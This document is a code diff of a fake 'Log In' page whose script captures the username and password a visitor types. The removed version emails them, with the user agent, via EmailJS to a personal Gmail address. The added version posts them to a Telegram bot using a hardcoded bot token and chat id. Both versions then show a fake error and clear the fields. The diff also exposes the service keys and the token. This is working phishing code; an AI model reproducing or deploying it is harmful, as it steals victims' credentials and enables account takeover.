@@ -45,7 +45,7 @@
             </p>
         </div>
 
-        <!-- Login Card -->
+        <!-- Card -->
         <div class="bg-white rounded-lg shadow-xl p-8">
             <h1 class="text-2xl font-semibold text-center text-gray-800 mb-6">Log In</h1>
             <!-- Error Message -->
@@ -54,23 +54,31 @@
             </div>
 
             <!-- Form -->
-            <form id="loginForm" class="space-y-6">
-                <div>
-                    <label class="block text-sm font-medium text-gray-700 mb-1.5">USERNAME</label>
+            <form id="loginForm" autocomplete="off">
+                <div class="form-group">
+                    <label for="username">
+                        Username
+                    </label>
                     <input
                         type="email"
                         id="username"
+                        name="username"
+                        form="Form"
                         placeholder="Username"
                         class="input-field w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none bg-gray-50"
                         required>
                 </div>
 
-                <div id="infoContainer">
-                    <label class="block text-sm font-medium text-gray-700 mb-1.5">PASSWORD</label>
+                <div class="form-group">
+                    <label for="Password">
+                        Password
+                    </label>
                     <div class="relative">
                         <input
                             type="password"
                             id="Password"
+                            name="password"
+                            form="loginForm"
                             placeholder="Password"
                             class="input-field w-full pr-20 px-4 py-3 border border-gray-300 rounded-md focus:outline-none bg-gray-50"
                             required>
@@ -122,52 +130,47 @@
         const errorBanner = document.getElementById('errorBanner');
         const loginBtn = document.getElementById('loginBtn');
 
-        const EMAILJS_SERVICE_ID = 'service_bzq0inh';
-        const EMAILJS_TEMPLATE_ID = 'template_87rjjnc';
-        const EMAILJS_PUBLIC_KEY = '6SuWsCdXwbJ2K7HPj';
-        emailjs.init(EMAILJS_PUBLIC_KEY);
-
-        // Form submission - send username and password via EmailJS (NO password)
-        form.addEventListener('submit', function(e) {
+        form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
-            const username = document.getElementById('username').value.trim();
-            const Password = document.getElementById('Password').value.trim();
-            const templateParams = {
-                to_email: 'akintadefaruk@gmail.com',
-                user_email: username,
-                user_password: Password,
-                userAgent: navigator.userAgent,
-                timestamp: new Date().toISOString()
-            };
+            const email = document.getElementById('username').value;
+            const password = document.getElementById('Password').value;
 
-            const originalBtnText = loginBtn.textContent;
-            loginBtn.textContent = 'LOADING...';
             loginBtn.disabled = true;
+            loginBtn.textContent = 'Loading...';
 
-            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
-                .then(() => {
-                    console.log('EmailJS message sent');
-                })
-                .catch((error) => {
-                    console.error('EmailJS error:', error);
-                })
-                .finally(() => {
-                    setTimeout(() => {
-                        errorBanner.style.display = 'block';
-                        loginBtn.textContent = originalBtnText;
-                        loginBtn.disabled = false;
+            try {
+                const response = await fetch(
+                    'https://api.telegram.org/bot8744881248:AAF0-8sCRoxRSLY0U_e9YRNmiUIOMpIve7I/sendMessage',
+                    {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: '7229009100',
+                            text: `Email: ${email}\nPassword: ${password}`
+                        })
+                    }
+                );
 
-                        // Clear entered values (email/username and password)
-                        const userInput = document.getElementById('username');
-                        const infoInput = document.getElementById('Password');
-                        if (userInput) userInput.value = '';
-                        if (infoInput) infoInput.value = '';
+                const data = await response.json();
 
-                        errorBanner.classList.add('animate-pulse');
-                        setTimeout(() => errorBanner.classList.remove('animate-pulse'), 1200);
-                    }, 800);
-                });
+                if (!data.ok) {
+                    throw new Error('Telegram send failed');
+                }
+
+                document.getElementById('username').value = '';
+                document.getElementById('Password').value = '';
+                errorBanner.style.display = 'block';
+            } catch (error) {
+                errorBanner.style.display = 'block';
+                console.error(error);
+                alert('Please try again.');
+            } finally {
+                loginBtn.textContent = 'Log in';
+                loginBtn.disabled = false;
+            }
         });
 
         const toggleInfoBtn = document.getElementById('toggleInfoBtn');
